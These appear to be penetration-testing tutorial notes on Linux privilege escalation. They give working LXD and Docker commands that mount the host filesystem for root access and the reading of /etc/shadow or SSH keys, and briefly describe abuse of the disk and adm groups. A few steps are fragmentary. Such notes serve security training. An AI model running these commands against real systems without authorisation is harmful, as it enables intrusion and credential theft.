## LXC / LXD

LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`. Let's confirm group membership and use these rights to escalate to root.


```shell-session
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

wget alpine


```shell-session
$ unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpin
```
Start the LXD initialization process. Choose the defaults for each prompt. Consult this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) for more information on each step.

```shell-session
devops@NIX02:~$ lxd init
```
Import the local image.

```shell-session
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

Start a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host.

```shell-session
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true
Creating r00t
```

Mount the host file system.

```shell-session
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

Device mydev added to r00t
```
Finally, spawn a shell inside the container instance. type
`cd /mnt/root/root`. From here we can read sensitive files such as `/etc/shadow` and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.
```shell-session
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ # 
```

## Docker
Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command `docker run -v /root:/mnt -it ubuntu`. This command creates a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as `/etc` which could be used to retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.

Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.

## ADM

Members of the adm group are able to read all logs stored in `/var/log`. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.


```shell-session
secaudit@NIX02:~$ id
```
